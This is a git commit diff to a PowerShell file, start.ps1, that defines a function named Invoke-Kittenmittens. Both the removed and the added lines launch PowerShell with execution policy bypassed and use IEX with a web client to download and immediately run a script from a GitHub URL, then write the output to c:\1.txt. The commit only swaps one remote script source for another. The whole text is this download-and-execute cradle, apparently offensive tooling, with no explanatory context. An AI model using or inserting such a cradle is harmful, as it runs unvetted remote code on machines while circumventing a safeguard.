b6a2be97b1e4bf1dde4960d29bdd4cbf4e32121a
gpsqqq <gpsqqq@gmx.com>
2017-03-05 21:18:54 -0800

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,5 +1,5 @@
 function Invoke-Kittenmittens
 {
-	powershell -ep bypass -c IEX (new-object net.webclient).downloadstring('https://github.com/sirpsycho/Invoke-Kittenmittens/raw/master/Invoke-Kittenmittens.ps1');
-	iNVOKE-kITTENMITTENS > c:\1.txt
+	powershell -ep bypass -c IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/gpsqqq/f/master/gh.ps1');
+	gh > c:\1.txt
 }
